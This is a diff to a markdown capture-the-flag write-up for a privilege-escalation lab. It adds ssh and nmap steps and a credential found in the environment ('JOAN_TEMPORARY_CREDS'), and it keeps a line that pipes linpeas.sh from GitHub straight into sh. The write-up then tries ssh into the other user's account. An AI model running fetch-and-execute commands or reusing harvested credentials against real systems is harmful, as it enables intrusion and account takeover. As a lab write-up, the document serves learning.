@@ -20,18 +20,44 @@ Usual disclaimer here: the following solution was the one that worked and there 
 
 ### Step 1: Initial Access
 
+```bash
+ssh Pentester@<ip>
+
+# no response
+```
+
+```bash
+nmap -sV <ip>
+
+#shows diff port
+```
+
+```bash
+ssh -p 2222 Pentester@<ip>
+```
+
+
 Challenge requires privilege escalation so let's go script kiddie and fetch a tool to search for privilege escalations (`privesc` as it's call in `the biz`):
 
 ```bash
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
 ```
 
-Well well well. Another user has stored temp creds in a file we have access to. Let's try sshing into their account and see what permissions they have. Fingers crossed they're in sudoers and we can use their privesc ours **sinister laughing**. 
+Under Environment we see `JOAN_TEMPORARY_CREDS=jojocreds1`
+
+Well well well. For reasons mysterious there are temp creds for another user in our environment of our account. Let's try sshing into their account and see what permissions they have. Fingers crossed they're in sudoers and we can use their privesc ours **sinister laughing**. Which account though? 
+
+```bash
+ls /home/
+# shows JOan 
+```
+Its probably the joan account. 
 
 ```bash
 
 ssh joan@localhost
-
+# no response
 ```
 
 ---
